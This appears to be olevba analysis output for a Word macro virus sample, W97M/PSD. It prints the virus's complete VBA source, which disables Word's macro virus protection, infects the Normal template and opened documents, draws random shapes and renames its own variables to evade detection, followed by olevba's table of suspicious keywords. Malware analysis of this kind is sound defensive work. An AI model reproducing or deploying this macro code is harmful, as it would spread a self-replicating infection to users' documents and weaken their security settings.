olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.a-3fd5affaf8136ddd2e4ef69be7f9e6c662e43075
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.a-3fd5affaf8136ddd2e4ef69be7f9e6c662e43075 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If 1 = 1 Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
CH5644 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
QV9723 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set CI6417 = ActiveDocument.VBProject.VBComponents.Item(1)
MB1475 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set CI6417 = NormalTemplate.VBProject.VBComponents.Item(1)
JB1324 = True
Call SB8349_FT433
ActiveDocument.Saved = True
End If
If JB1324 <> True And MB1475 <> True Then GoTo RJ7928
If JB1324 = True Then CI6417.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CH5644 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If MB1475 = True Then CI6417.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, QV9723 - 3))
RJ7928:
If QV9723 <> 0 And CH5644 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'W97M/PSD ...porn star dreams? [(c)1998 ALT-F11 code hack]
Private Function SB8349_FT433()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "LB8949": r1(2) = "GC2056": r1(3) = "FV6812": r1(4) = "RP3493": r1(5) = "FT433": r1(6) = "CH5644"
r1(7) = "QV9723": r1(8) = "MB1475":: r1(9) = "CI6417": r1(10) = "JB1324": r1(11) = "RJ7928": r1(12) = "SB8349": r1(13) = "LH3242": r1(14) = "QT3178"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call FT433(a1, r1(x))
Next x
End Function 'VAMP v1.0 [thanks Vic!]
Private Function FT433(QT3178, LH3242 As String)
On Error Resume Next
Dim LB8949 As Long: Dim GC2056 As Long: Dim FV6812 As Long: Dim RP3493 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
LB8949 = 1: GC2056 = 1: FV6812 = .CountOfLines: RP3493 = Len(.Lines(.CountOfLines, 1))
Do While .Find(LH3242, LB8949, GC2056, FV6812, RP3493, True)
strline = .Lines(LB8949, 1)
strline = Left(strline, GC2056 - 1) & QT3178 & Mid(strline, RP3493)
.replaceline LB8949, strline
LB8949 = FV6812 + 1: GC2056 = 1:
FV6812 = .CountOfLines
RP3493 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

